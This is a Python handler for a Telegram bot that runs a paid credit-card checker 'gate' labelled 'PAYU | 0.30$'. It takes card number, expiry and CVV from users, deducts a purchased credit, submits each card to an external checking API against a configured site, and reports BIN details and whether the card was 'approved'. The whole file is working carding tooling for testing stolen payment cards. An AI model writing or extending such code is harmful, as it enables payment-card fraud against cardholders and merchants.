import aiohttp
import asyncio
import time
import re
from telegram import Update
from telegram.ext import CommandHandler, ContextTypes
from config import PYU_API, PYU_SITE, API_TIMEOUT, get_bin_info, ui_result, kb_result
from plans import deduct_credit

GATE_NAME = "PAYU | 0.30$"

async def cmd_pyu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.bot_data.get('pyu_on', True):
        await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML")
        return
    
    card = None
    if context.args: card = context.args[0]
    elif update.message.reply_to_message and update.message.reply_to_message.text: card = update.message.reply_to_message.text.strip()
        
    if not card:
        await update.message.reply_text("⚠️ Uꜱᴀɢᴇ: Rᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪᴛʜ ᴄᴀʀᴅꜱ ᴏʀ ꜱᴇɴᴅ\n/pyu cc|mm|yy|cvv", parse_mode="HTML")
        return
    
    if not deduct_credit(update.effective_user.id):
        await update.message.reply_text("Buy the PLANS and Start the checking you trils cradits are empty.", parse_mode="HTML")
        return
    
    bin_num = card[:6]
    msg = await update.message.reply_text("⏳ Pʀᴏᴄᴇꜱꜱɪɴɢ...", parse_mode="HTML")
    start_time = time.time()
    
    try:
        timeout = aiohttp.ClientTimeout(total=API_TIMEOUT)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            tasks = [session.get(PYU_API, params={"cc": card, "site": PYU_SITE}), get_bin_info(bin_num)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
        
        api_resp = results[0]
        bin_data = results[1] if not isinstance(results[1], Exception) else {"error": True}
        if isinstance(api_resp, Exception): raise api_resp
        
        data = await api_resp.json()
        raw = re.sub(r'https?://\S+', '', str(data.get("response", "ERROR"))).strip()
        if not raw: raw = "NO RESPONSE"
        approved = "approved" in raw.lower()
        
        bin_txt, country, flag = "N/A", "N/A", ""
        if not bin_data.get("error"):
            s = str(bin_data.get("scheme", "N/A")).upper()
            t = str(bin_data.get("type", "N/A")).upper()
            b = bin_data.get("bank", "N/A")
            country = str(bin_data.get("country", "N/A")).upper()
            flag = bin_data.get("country_emoji", "")
            bin_txt = f"{s} - {t} - {b}"
            
        time_taken = f"{time.time() - start_time:.2f}"
        await msg.edit_text(ui_result(card, GATE_NAME, bin_txt, country, flag, raw, update.effective_user, approved, time_taken), parse_mode="HTML", reply_markup=kb_result(), disable_web_page_preview=True)
        
    except aiohttp.ClientTimeout: await msg.edit_text("⏳ Tɪᴍᴇᴏᴜᴛ", parse_mode="HTML")
    except Exception as e: await msg.edit_text(f"❌ Eʀʀᴏʀ ➤ <code>{str(e)[:100]}</code>", parse_mode="HTML")

def get_pyu_handler(): return CommandHandler("pyu", cmd_pyu)
